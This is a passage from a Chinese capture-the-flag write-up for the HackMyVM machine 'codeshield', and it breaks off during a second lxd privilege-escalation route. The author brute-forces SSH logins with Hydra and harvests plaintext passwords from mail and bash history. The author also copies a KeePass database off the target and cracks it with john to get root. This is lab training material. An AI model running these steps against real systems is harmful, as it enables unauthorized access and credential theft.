  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
hgbe@10.0.2.22's password: 
```

很明显，优先尝试下面的，尝试爆破，由于看了师傅们的结果我这里就直接做做样子了。。。

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ hydra -L user -P pass ssh://$IP -f -s 22222 -V 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-30 02:29:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:2/p:10), ~2 tries per task
[DATA] attacking ssh://10.0.2.22:22222/
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Xxxxxxxxx001" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Password123!" - 2 of 20 [child 1] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Greatplace2work!" - 3 of 20 [child 2] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Diciembre@2017" - 4 of 20 [child 3] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Hairdresser1!" - 5 of 20 [child 4] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "1qa2ws3ed4rf" - 6 of 20 [child 5] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "XXXX12345678" - 7 of 20 [child 6] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Hairdresser1" - 8 of 20 [child 7] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Xxxxxxxxx002" - 9 of 20 [child 8] (0/0)
[ATTEMPT] target 10.0.2.22 - login "mitchellt" - pass "Xxxxxxxxxx01" - 10 of 20 [child 9] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "Xxxxxxxxx001" - 11 of 20 [child 10] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "Password123!" - 12 of 20 [child 11] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "Greatplace2work!" - 13 of 20 [child 12] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "Diciembre@2017" - 14 of 20 [child 13] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "Hairdresser1!" - 15 of 20 [child 14] (0/0)
[ATTEMPT] target 10.0.2.22 - login "valdezk" - pass "1qa2ws3ed4rf" - 16 of 20 [child 15] (0/0)
[22222][ssh] host: 10.0.2.22   login: valdezk   password: Greatplace2work!
[STATUS] attack finished for 10.0.2.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 02:29:23
```

得到一串新的凭证：

```text
valdezk:Greatplace2work!
```

登录看一下：

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ ssh -o StrictHostKeyChecking=no valdezk@10.0.2.22 -p 22222
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@10.0.2.22's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May 30 06:36:11 AM UTC 2025

  System load:  0.169921875        Processes:               245
  Usage of /:   29.4% of 47.93GB   Users logged in:         0
  Memory usage: 64%                IPv4 address for enp0s3: 10.0.2.22
  Swap usage:   1%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


valdezk@codeshield:~$ whoami;id;pwd
valdezk
uid=1007(valdezk) gid=1007(valdezk) groups=1007(valdezk)
/home/valdezk
valdezk@codeshield:~$ ls -la
total 172
drwxr-x--- 18 valdezk valdezk  4096 Aug 29  2023 .
drwxr-xr-x 14 root    root     4096 Aug 26  2023 ..
-rw-rw-r--  1 valdezk valdezk     0 Aug 28  2023 .bash_history
-rw-r--r--  1 valdezk valdezk   220 Aug 26  2023 .bash_logout
-rw-r--r--  1 valdezk valdezk  3771 Aug 26  2023 .bashrc
drwx------ 12 valdezk valdezk  4096 May 30 06:29 .cache
drwx------ 11 valdezk valdezk  4096 Aug 28  2023 .config
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Desktop
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Documents
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Downloads
drwx------  3 valdezk valdezk  4096 Aug 28  2023 .local
drwx------  3 valdezk valdezk  4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Music
drwxrwxrwt  2 valdezk valdezk  4096 Aug 29  2023 .pcsc10
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Pictures
-rw-r--r--  1 valdezk valdezk   807 Aug 26  2023 .profile
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Public
drwx------  3 valdezk valdezk  4096 Aug 28  2023 snap
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Templates
drwxrwxr-t  2 valdezk valdezk  4096 Aug 29  2023 thinclient_drives
drwx------  6 valdezk valdezk  4096 Aug 28  2023 .thunderbird
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-clipboard-tty4-control.pid
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-draganddrop-tty1-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-draganddrop-tty4-control.pid
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-hostversion-tty1-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-hostversion-tty4-control.pid
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-seamless-tty1-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-seamless-tty4-control.pid
-rw-r-----  1 valdezk valdezk     5 Aug 29  2023 .vboxclient-vmsvga-session-tty1-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
-rw-r-----  1 valdezk valdezk     6 Aug 28  2023 .vboxclient-vmsvga-session-tty4-control.pid
drwxr-xr-x  2 valdezk valdezk  4096 Aug 28  2023 Videos
-rw-------  1 valdezk valdezk    56 Aug 29  2023 .Xauthority
-rw-r--r--  1 valdezk valdezk 18728 Aug 29  2023 .xorgxrdp.10.log
-rw-------  1 valdezk valdezk  3985 Aug 29  2023 .xsession-errors
```

可以！

## 提权

### 信息搜集

找一下密码：

```bash
valdezk@codeshield:~$ grep -Pnir pass
```

然后找到了一个：

```bash
.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/INBOX:Password: D@taWh1sperer!
```

### 爆破新用户

然后找一下有没有类似的用户名：

```bash
valdezk@codeshield:~$ cut -d: -f1 /etc/passwd
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
_apt
systemd-network
systemd-resolve
messagebus
systemd-timesync
pollinate
sshd
syslog
uuidd
tcpdump
tss
landscape
fwupd-refresh
usbmux
earlyp
lxd
rtkit
dnsmasq
kernoops
systemd-oom
whoopsie
avahi-autoipd
nm-openvpn
avahi
cups-pk-helper
sssd
speech-dispatcher
saned
colord
geoclue
pulse
gnome-initial-setup
hplip
gdm
vboxadd
ftp
cowrie
mysql
postfix
dovecot
dovenull
clamav
amavis
debian-spamd
vmail
mlmmj
iredadmin
iredapd
netdata
postgres
mitchellt
valdezk
carlsonj
mansourm
tanx
coccia
xrdp
```

和之前的用户名对比一下：

```bash
┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ grep -F -f user1 user2                                 
earlyp
mitchellt
carlsonj
mansourm
tanx
coccia
```

存在几个用户名相同，用这里的用户名进行爆破：

```bash
┌──(kali💀kali)-[~/temp/codeshield/generate-ad-username]
└─$ hydra -L user3 -p D@taWh1sperer! ssh://$IP:22222 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-30 02:51:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.0.2.22:22222/
[22222][ssh] host: 10.0.2.22   login: mitchellt   password: D@taWh1sperer!
[STATUS] attack finished for 10.0.2.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 02:51:40
```

得到新用户，直接切换：

```bash
valdezk@codeshield:~$ su mitchellt
Password: 
mitchellt@codeshield:/home/valdezk$ cd ~
mitchellt@codeshield:~$ ls -la
total 112
drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
-rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history
-rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout
-rw-r--r--  1 mitchellt mitchellt 3771 Aug 26  2023 .bashrc
drwx------ 11 mitchellt mitchellt 4096 May 30 06:51 .cache
drwx------ 12 mitchellt mitchellt 4096 Aug 29  2023 .config
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Desktop
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Documents
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Downloads
-rw-------  1 mitchellt mitchellt   20 Aug 29  2023 .lesshst
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .local
drwxrwxr-x  6 mitchellt mitchellt 4096 Aug 30  2023 mining
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Music
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Pictures
-rw-r--r--  1 mitchellt mitchellt  807 Aug 26  2023 .profile
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Public
drwx------  3 mitchellt mitchellt 4096 Aug 29  2023 snap
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Templates
drwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird
-rwxrwx---  1 mitchellt mitchellt 2401 Aug 28  2023 user.txt
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos
mitchellt@codeshield:~$ cat user.txt 
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗  
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗ 
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║ 
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║ 
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝ 
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  
        @@@@@@@   @@@                       
           @@@@@@@                          

  _______________________________________________________________________________________________________
 |  _USER FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | Your_password_is_the_key_to_your_digital_life                                                     | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________| 
```

### history找到明文密码

```bash
mitchellt@codeshield:~$ cat .bash_history 
echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
cp -r /tmp/mining .
ls
cd mining/
ls
exit
```

得到新密码`EARL!YP7DeVel@OP`，切换就行：

```bash
mitchellt@codeshield:~$ su - earlyp
Password: 
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22  2023 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures
-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public
-rw-rw-r--  1 earlyp earlyp  233 Aug 23  2023 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22  2023 snap
drwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
```

### 提权root(方法一:kdbx文件)

信息搜集可以找到一个`.kdbx`文件，破解一下即可得到root密码：

```bash
earlyp@codeshield:~$ grep -Pnir password
```

找到一个密码文件：

```bash
.cache/keepassxc/keepassxc.ini:2:LastActiveDatabase=/home/earlyp/Documents/Passwords.kdbx
.cache/keepassxc/keepassxc.ini:4:LastDatabases=/home/earlyp/Documents/Passwords.kdbx
.cache/keepassxc/keepassxc.ini:6:LastOpenedDatabases=/home/earlyp/Documents/Passwords.kdbx
```

拷贝到本地进行破解：

```bash
earlyp@codeshield:~$ cd Documents/
earlyp@codeshield:~/Documents$ ls -la
total 12
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
earlyp@codeshield:~/Documents$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.0.2.4 - - [30/May/2025 07:05:05] "GET /Passwords.kdbx HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ wget http://$IP:8888/Passwords.kdbx
--2025-05-30 03:26:21--  http://10.0.2.22:8888/Passwords.kdbx
Connecting to 10.0.2.22:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1918 (1.9K) [application/octet-stream]
Saving to: ‘Passwords.kdbx’

Passwords.kdbx                                  100%[====================================================================================================>]   1.87K  --.-KB/s    in 0s      

2025-05-30 03:26:21 (198 MB/s) - ‘Passwords.kdbx’ saved [1918/1918]

┌──(kali💀kali)-[~/temp/codeshield]
└─$ keepass2john Passwords.kdbx > hash

┌──(kali💀kali)-[~/temp/codeshield]
└─$ john hash --wordlist=pass 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 3225806 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2025-05-30 03:27) 0g/s 2.309p/s 2.309c/s 2.309C/s Xxxxxxxxx002..Xxxxxxxxxx01
Session completed. 
```

那只能`rockyou`了，这里快速剽窃了一下密码：

```text
mandalorian
```

去在线的管理器上看一下密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612549.png" alt="image-20250530155148306" style="zoom:50%;" />

```text
root:7%z5,c9=w6[x8=
```

切换用户拿到rootshell！

```bash
earlyp@codeshield:~/Documents$ su - root
Password: 
root@codeshield:~# ls -la
total 92
drwx------  9 root root 4096 Aug 26  2023 .
drwxr-xr-x 19 root root 4096 Aug 22  2023 ..
-rw-------  1 root root    0 Aug 30  2023 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Aug 28  2023 .cache
drwxr-xr-x  2 root root 4096 Aug 26  2023 cowrie
drwxr-xr-x  3 root root 4096 Aug 26  2023 .iredmail
drwx------  3 root root 4096 Aug 23  2023 .launchpadlib
-rw-------  1 root root   20 Aug 23  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug 22  2023 .local
-r--------  1 root root   45 Aug 26  2023 .my.cnf
-rw-r--r--  1 root root   91 Aug 26  2023 .my.cnf-amavisd
-rw-r--r--  1 root root   92 Aug 26  2023 .my.cnf-fail2ban
-rw-r--r--  1 root root   93 Aug 26  2023 .my.cnf-iredadmin
-rw-r--r--  1 root root   91 Aug 26  2023 .my.cnf-iredapd
-rw-r--r--  1 root root   93 Aug 26  2023 .my.cnf-roundcube
-r--------  1 root root   89 Aug 26  2023 .my.cnf-vmail
-r--------  1 root root   94 Aug 26  2023 .my.cnf-vmailadmin
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root 2528 Aug 26  2023 root.txt
-rw-r--r--  1 root root   66 Aug 26  2023 .selected_editor
drwx------  4 root root 4096 Aug 22  2023 snap
drwx------  2 root root 4096 Aug 22  2023 .ssh
-rw-r--r--  1 root root    0 Aug 22  2023 .sudo_as_admin_successful
-rw-r--r--  1 root root  290 Aug 26  2023 .wget-hsts
root@codeshield:~# cat root.txt 

             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _ROOT FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | Educate_your_employees_on_password_safety                                                         | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________| 
```

### 提权root(方法2:lxd)

也是看别的师傅的思路的，真没注意到，原因是一个特殊的组权限：

```bash
earlyp@codeshield:~$ id
uid=1000(earlyp) gid=1000(earlyp) groups=1000(earlyp),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

参考：https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html#with-internet

```bash
# kali
┌──(kali💀kali)-[~/temp/codeshield]
└─$ git clone https://github.com/saghul/lxd-alpine-builder
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42 (from 1)
Receiving objects: 100% (50/50), 3.11 MiB | 3.21 MiB/s, done.
Resolving deltas: 100% (15/15), done.

┌──(kali💀kali)-[~/temp/codeshield]
└─$ cd lxd-alpine-builder

┌──(kali💀kali)-[~/temp/codeshield/lxd-alpine-builder]
└─$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine

┌──(kali💀kali)-[~/temp/codeshield/lxd-alpine-builder]
└─$ sudo ./build-alpine -a i686
[sudo] password for kali: 
Determining the latest release... v3.8
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.8/main/x86
Downloading alpine-keys-2.1-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.10.6-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-mirrors-3.5.9-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3264  100  3264    0     0    831      0  0:00:03  0:00:03 --:--:--   832
--2025-05-30 04:04:20--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.24, 2a00:1f00:dc06:10::6
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.24|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3264 (3.2K) [text/plain]
Saving to: ‘/home/kali/temp/codeshield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/kali/temp/codeshield/lxd-alpine-builder/r 100%[====================================================================================================>]   3.19K  --.-KB/s    in 0s      

2025-05-30 04:04:21 (9.01 MB/s) - ‘/home/kali/temp/codeshield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [3264/3264]

Selecting mirror http://mirrors.ocf.berkeley.edu/alpine//v3.8/main
fetch http://mirrors.ocf.berkeley.edu/alpine//v3.8/main/x86/APKINDEX.tar.gz
(1/18) Installing musl (1.1.19-r11)
(2/18) Installing busybox (1.28.4-r3)
Executing busybox-1.28.4-r3.post-install
(3/18) Installing alpine-baselayout (3.1.0-r0)
Executing alpine-baselayout-3.1.0-r0.pre-install
Executing alpine-baselayout-3.1.0-r0.post-install
(4/18) Installing openrc (0.35.5-r5)
Executing openrc-0.35.5-r5.post-install
(5/18) Installing alpine-conf (3.8.0-r0)
(6/18) Installing libressl2.7-libcrypto (2.7.5-r0)
(7/18) Installing libressl2.7-libssl (2.7.5-r0)
(8/18) Installing libressl2.7-libtls (2.7.5-r0)
